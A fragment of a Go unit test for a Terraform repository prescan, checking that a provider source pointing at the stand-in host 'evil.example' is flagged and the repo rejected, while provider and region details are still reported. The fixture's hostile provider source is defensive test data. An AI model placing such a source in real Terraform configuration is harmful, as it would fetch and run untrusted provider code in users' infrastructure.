	rep := covprescanScan(t, map[string]string{
		"main.tf": `terraform {
  required_providers {
    aws = {
      source  = "evil.example/hashicorp/aws"
      version = "~> 6.0"
    }
  }
}

provider "aws" {
  region = "eu-central-1"
}
`,
	}, nil)
	covprescanWantFindings(t, rep, []Finding{
		{Code: CodeProviderSource, File: "main.tf", Line: 4},
	})
	pc := rep.ProviderConfig
	if pc == nil {
		t.Fatal("ProviderConfig = nil, want the census reported even for a rejected repo")
	}
	if len(pc.Providers) != 1 || pc.Providers[0].Value != "aws" || pc.Providers[0].Line != 3 {
		t.Errorf("Providers = %+v, want one aws entry at line 3 (first occurrence wins)", pc.Providers)
	}
	if pc.AWSRegion == nil || pc.AWSRegion.Value != "eu-central-1" {
		t.Errorf("AWSRegion = %+v, want eu-central-1", pc.AWSRegion)
	}
}
